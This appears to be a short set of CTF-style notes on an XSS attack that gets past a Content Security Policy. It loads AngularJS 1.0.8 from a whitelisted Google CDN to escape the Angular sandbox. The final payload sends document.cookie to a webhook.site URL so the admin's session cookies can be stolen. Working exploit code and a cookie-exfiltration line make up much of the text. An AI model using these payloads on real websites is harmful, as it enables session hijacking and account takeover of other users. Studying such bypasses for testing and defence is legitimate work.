#The piece of source code that has to be read for an xss attack is always inside the page.

#We may need a server to hook our requests. There is requestbin.net or as an alternative webhook.site

#1- Look if there is a possible code injection <script> alert(1) </script>
#In the first page we put that code in every field but nothing strage happened.
#We try again in the second page but nothing happens.
#If there is red stuff in the console which states the content security policy
#Then we know that some vulnerability has been mitigated by it.
#Another way to check Content security policy is to check in the network tab of the browser.
#And look at the header of requests there.

#2- We can retry but adding some text that's different for every field in order to distinguish them.
#In "comment section" we see that one of the scripts has been removed by the csp.
#Actually, it has either been executed or it has been hidden. 
#Inspecting the element we see that it is just hidden.
#If cookies are tracking me I can check that the admin will se the same things I see copying and pasting the same link into a new browser page in private mode.

#3-Check for know vulnerable libraries https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt and try if they work
#And we need some code to inject

"""
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
<div ng-app ng-csp>
    {{$eval.constructor('alert(document.cookie)')()}}
</div>
"""

#Use => document.cookie = {"asdasd":"asdasd"} to add a cookie with the console
#Use a plugin to modify the cookie
#Out hook bot link https://webhook.site/0ebaa3eb-ac43-4230-9e51-4e8e91f29267
#We need to adjust the script. The JS get has to be inline.

"""
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
<div ng-app ng-csp>
    {{$eval.constructor("document.location ='https://webhook.site/0ebaa3eb-ac43-4230-9e51-4e8e91f29267/?'+document.cookie")()}}
</div>
"""

#Now make the admin access the given link and steal his admin cookies